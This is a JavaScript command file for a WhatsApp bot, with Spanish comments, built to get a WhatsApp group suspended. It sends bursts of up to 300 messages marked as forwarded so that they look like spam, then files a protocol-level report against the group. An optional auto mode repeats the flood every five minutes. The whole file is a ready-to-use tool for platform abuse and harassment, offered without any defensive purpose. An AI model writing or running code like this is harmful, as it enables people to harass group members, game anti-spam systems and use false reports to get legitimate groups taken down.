// commands/group/tumbar.js
//
// Tumba el grupo por SPAM: el bot le manda una ráfaga de mensajes reenviados
// (WhatsApp huele spam por eso) y además le manda un "report" al grupo.
// El anti-spam de WhatsApp lo detecta -> lo manda a revisión -> "no disponible".

const ESPERA = (ms) => new Promise((r) => setTimeout(r, ms));

const CANTIDAD = 40;   // mensajes por ráfaga
const PAUSA = 400;     // ms entre mensaje y mensaje

const AUTO_CANTIDAD = 15;            // mensajes por ráfaga en modo auto
const AUTO_CADA = 5 * 60 * 1000;     // cada cuánto repite (5 min)

const TEXTOS = ['💥 grupo tumbado', '☠️ spam', '⚡ ALEX BOT', '🔥 tumbando', '💣 boom'];

const auto = new Map(); // chatId -> intervalId

async function rafaga(sock, chatId, n) {
    for (let i = 0; i < n; i++) {
        try {
            await sock.sendMessage(chatId, {
                text: TEXTOS[i % TEXTOS.length],
                contextInfo: { forwardingScore: 1, isForwarded: true } // <- lo hace ver spam
            });
        } catch (error) {
            console.error('[TUMBAR] mensaje falló:', error?.message || error);
        }
        await ESPERA(PAUSA);
    }
}

// Report del grupo: iq <report> en el namespace w:gp2 (así lo hace WhatsApp Web)
async function reportarGrupo(sock, chatId) {
    await sock.query({
        tag: 'iq',
        attrs: { id: String(Date.now()), to: 'g.us', type: 'set', xmlns: 'w:gp2' },
        content: [{ tag: 'report', attrs: { jid: chatId } }]
    });
}

export default {
    nombre: 'tumbar',
    categoria: 'grupos',
    alias: ['spam', 'spamear', 'reportar'],
    descripcion: 'Tumba el grupo a puro spam + report hasta que WhatsApp lo mande a revisión. Uso: .tumbar | .tumbar 80 | .tumbar auto | .tumbar off',

    ejecutar: async ({ sock, msg, responder, argumento }) => {
        const chatId = msg.key.remoteJid;
        if (!chatId.endsWith('@g.us')) {
            return responder.texto('❌ Este comando solo funciona dentro de un grupo.');
        }

        const arg = (argumento || '').trim().toLowerCase();

        // ---- modo AUTO: repite la ráfaga cada 5 min hasta que lo apagues ----
        if (['auto', 'on', 'off', 'stop'].includes(arg)) {
            if (arg === 'off' || arg === 'stop') {
                if (auto.has(chatId)) {
                    clearInterval(auto.get(chatId));
                    auto.delete(chatId);
                }
                return responder.texto('🛑 Modo auto apagado.');
            }

            if (auto.has(chatId)) {
                return responder.texto('🔁 Ya estaba prendido. Apagalo con *.tumbar off*');
            }

            const id = setInterval(() => {
                rafaga(sock, chatId, AUTO_CANTIDAD).catch(() => {});
            }, AUTO_CADA);
            auto.set(chatId, id);

            return responder.texto(
                `🔁 *Modo auto PRENDIDO*\n\n` +
                `┃ Manda *${AUTO_CANTIDAD}* mensajes cada 5 min\n` +
                `┃ Apagalo con *.tumbar off*\n\n` +
                `💡 Déjalo corriendo hasta que WhatsApp lo tumbe.`
            );
        }

        // ---- golpe único ----
        let n = parseInt(arg, 10);
        if (!Number.isFinite(n) || n < 1) n = CANTIDAD;
        if (n > 300) n = 300;

        await responder.texto(`💥 Spameando el grupo (*${n}* mensajes)...`);

        await rafaga(sock, chatId, n);

        let reportado = false;
        try {
            await reportarGrupo(sock, chatId);
            reportado = true;
        } catch (error) {
            console.error('[TUMBAR] Report falló:', error?.message || error);
        }

        await responder.texto(
            `☠️ *GOLPE TERMINADO*\n\n` +
            `┃ Mensajes mandados: *${n}*\n` +
            `┃ Report al grupo: *${reportado ? 'enviado ✅' : 'no se pudo'}*\n\n` +
            `💡 WhatsApp lo detecta por spam y lo manda a revisión. No es instantáneo, dale unas horas.`
        );
    }
};